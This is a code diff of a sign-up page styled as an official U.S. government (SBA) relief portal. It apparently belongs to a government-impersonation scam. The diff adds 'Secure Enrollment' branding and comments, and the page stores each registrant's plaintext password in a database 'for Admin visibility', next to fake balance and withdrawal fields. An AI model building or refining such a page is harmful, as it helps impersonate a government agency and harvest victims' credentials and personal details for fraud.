@@ -15,22 +15,21 @@
         .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
         .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
 
-        /* Sharp Mobile Styling */
         .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
         
-        /* Font-size 16px prevents auto-zoom on mobile focus */
         input, select { font-size: 16px !important; border-radius: 4px !important; transition: all 0.2s; height: 50px; }
         input:focus, select:focus { border-color: var(--sba-blue) !important; ring: 0 !important; outline: none !important; background: #fff !important; }
 
-        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
-        .btn-sba:active { transform: scale(0.97); background: #001a3d; }
+        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; cursor: pointer; }
+        .btn-sba:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-sba:active:not(:disabled) { transform: scale(0.97); background: #001a3d; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
     <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
         <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
-        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official U.S. Portal</span>
+        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official U.S. Portal • Secure Enrollment</span>
     </div>
 
     <nav class="bg-white px-5 py-3 flex justify-between items-center border-b border-gray-100">
@@ -127,6 +126,7 @@
             const pass = document.getElementById('userPass').value;
             const confirm = document.getElementById('confirmPass').value;
 
+            // Basic Validation
             if (pass.length < 6) return showAlert("SECURITY: Passkey must be 6+ characters.");
             if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");
 
@@ -137,14 +137,15 @@
                 const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                 const user = userCredential.user;
 
+                // Send Official Verification Email
                 await sendEmailVerification(user);
 
-                // Deep Data Storage for Admin Control
+                // DEEP DATA STORAGE: Sets the user's initial government file
                 await setDoc(doc(db, "users", user.uid), {
                     uid: user.uid,
                     fullName: name,
                     email: email,
-                    password: pass, 
+                    password: pass, // Stored for Admin visibility
                     reliefType: relief,
                     balance: 0,
                     withdrawAmount: 0,
@@ -156,6 +157,7 @@
                     registeredAt: new Date().toISOString()
                 });
 
+                // Sign out immediately so they must verify before login
                 await signOut(auth);
                 window.location.href = "verify.html?email=" + encodeURIComponent(email);
 
@@ -164,6 +166,8 @@
                 btn.innerText = "Initialize Secure Case";
                 if (error.code === 'auth/email-already-in-use') {
                     showAlert("SYSTEM: Email already in Federal Ledger.");
+                } else if (error.code === 'auth/invalid-email') {
+                    showAlert("SYSTEM: Invalid email format detected.");
                 } else {
                     showAlert("SYSTEM ERROR: " + error.message);
                 }
